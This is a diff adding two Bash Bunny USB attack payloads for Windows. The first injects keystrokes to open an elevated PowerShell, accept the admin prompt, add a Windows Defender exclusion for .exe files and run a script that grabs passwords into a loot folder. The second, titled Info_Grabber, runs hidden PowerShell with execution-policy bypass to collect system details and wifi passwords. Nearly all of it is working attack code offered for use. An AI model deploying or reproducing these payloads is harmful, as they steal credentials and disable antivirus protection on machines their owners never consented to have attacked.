@@ -1,0 +1,61 @@
+#!/bin/bash
+# Options
+LOOTDIR=/root/udisk/loot/password
+
+######## INITIALIZATION ########
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+######## MAKE LOOT DIRECTORY ########
+# Setup named logs in loot directory
+mkdir -p $LOOTDIR
+
+######## ATTACK ########
+LED ATTACK
+DUCKY_LANG us
+QUACK GUI r 
+QUACK STRING "powershell"
+QUACK ENTER
+QUACK STRING "Start-Process -verb runAs powershell"
+QUACK ENTER
+QUACK DELAY 1500
+QUACK ALT y
+QUACK DELAY 1000
+QUACK STRING Add-MpPreference -ExclusionExtension ".exe"
+QUACK ENTER
+QUACK STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch1\payload.ps1')"
+QUACK ENTER
+# Wait until passwords are grabbed.
+sleep 10
+Q STRING "exit"
+Q ENTER
+Q STRING "exit"
+Q ENTER
+
+######## FINISH ########
+LED FINISH
+######################################################################
+
+#!/bin/bash
+#
+# Title:            Info_Grabber
+# Original Author:  Simen Kjeserud
+# V2.0 Author:      DannyK999
+# Version:          2.0
+# Target:           Windows
+# Creds:            Hak5Darren, Hak5 and Simen Kjeserud for inspiration
+# 
+# Executes run.ps1 which executes scripts that gets you information about
+# the computer running and will also get wifi passwords
+
+
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+LED ATTACK
+# Run the run.ps1 script in the BashBunny
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
+sleep 5
+LED FINISH
